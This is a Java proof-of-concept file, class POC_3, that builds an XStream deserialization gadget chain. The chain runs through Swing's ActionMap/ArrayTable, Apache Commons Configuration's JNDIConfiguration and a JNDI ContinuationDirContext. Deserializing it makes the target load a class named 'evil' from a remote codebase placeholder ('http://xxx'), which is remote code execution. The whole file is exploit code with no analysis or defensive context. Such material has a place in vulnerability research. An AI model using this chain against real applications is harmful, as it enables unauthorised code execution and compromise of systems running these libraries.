package com.example.CC;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.XStreamUtil;
import org.apache.commons.configuration.Configuration;
import org.apache.commons.configuration.JNDIConfiguration;
import org.apache.commons.logging.impl.NoOpLog;

import javax.naming.CannotProceedException;
import javax.naming.Reference;
import javax.naming.directory.DirContext;
import javax.swing.*;
import javax.swing.text.DefaultEditorKit;
import java.lang.reflect.Constructor;
import java.util.Collections;
import java.util.Hashtable;

public class POC_3 {

    /***
     * run with actionMap_equals.jar
     */

    public static void main(String[] args) throws Exception {
        DirContext ctx = makeContinuationContext("http://xxx", "evil");
        JNDIConfiguration jc = new JNDIConfiguration();
        jc.setContext(ctx);
        jc.setPrefix("foo");

        ReflectionUtil.setField(jc, "errorListeners", Collections.EMPTY_LIST);
        ReflectionUtil.setField(jc, "listeners", Collections.EMPTY_LIST);
        ReflectionUtil.setField(jc, "log", new NoOpLog());

        Class<?> cl = Class.forName("org.apache.commons.configuration.ConfigurationMap");
        Constructor<?> cons = cl.getDeclaredConstructor(Configuration.class);
        cons.setAccessible(true);
        Object configurationMap1 = cons.newInstance(jc);
        Object configurationMap2 = cons.newInstance(jc);

        ActionMap map = new ActionMap();
        DefaultEditorKit.BeepAction action = new DefaultEditorKit.BeepAction();

        Object arrayTable = ReflectionUtil.createWithoutConstructor(Class.forName("javax.swing.ArrayTable"));
        Object[] table = new Object[]{configurationMap1, action, configurationMap2, action};

        ReflectionUtil.setField(arrayTable, "table", table);
        ReflectionUtil.setField(map, "arrayTable", arrayTable);

        XStreamUtil.deserialize(XStreamUtil.serialize(map));
    }

    public static DirContext makeContinuationContext(String codebase, String clazz) throws Exception {
        Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext"); //$NON-NLS-1$
        Constructor<?> ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
        ccCons.setAccessible(true);
        CannotProceedException cpe = new CannotProceedException();
        ReflectionUtil.setField(cpe, "stackTrace", new StackTraceElement[0]);
        cpe.setResolvedObj(new Reference("Foo", clazz, codebase));
        return (DirContext) ccCons.newInstance(cpe, null);
    }
}
